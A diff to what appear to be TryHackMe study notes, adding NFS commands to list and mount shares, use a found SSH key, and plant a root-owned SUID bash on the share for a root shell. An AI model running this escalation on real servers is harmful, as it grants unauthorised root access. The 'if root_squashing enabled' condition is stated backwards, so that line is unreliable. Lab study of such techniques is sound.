@@ -384,7 +384,18 @@ XXX
 
 * NFS stands for "Network File System"
 * Mount remote repository on local host
-* RPC calls to check with the server access rights
+* RPC is used for exchanges with the server
+* transfer files between computers running Windows and other non-Windows operating systems, and vice-versa
+* sudo apt install nfs-common
+* see mounts: `showmount -e 10.10.72.134`
+* sudo mount -t nfs IP:/share /tmp/mount/ -nolock (not to use NLM locking)
+* chmod 600 id_rsa
+* if root_squashing enabled
+  * remote: cp /bin/bash /share/sbash
+  * local
+    * sudo chown root /tmp/mount/sbash
+    * sudo chmod +s /tmp/mount/sbash
+  * remote: /share/sbash -p
 
 --- https://tryhackme.com/room/crackthehash
 
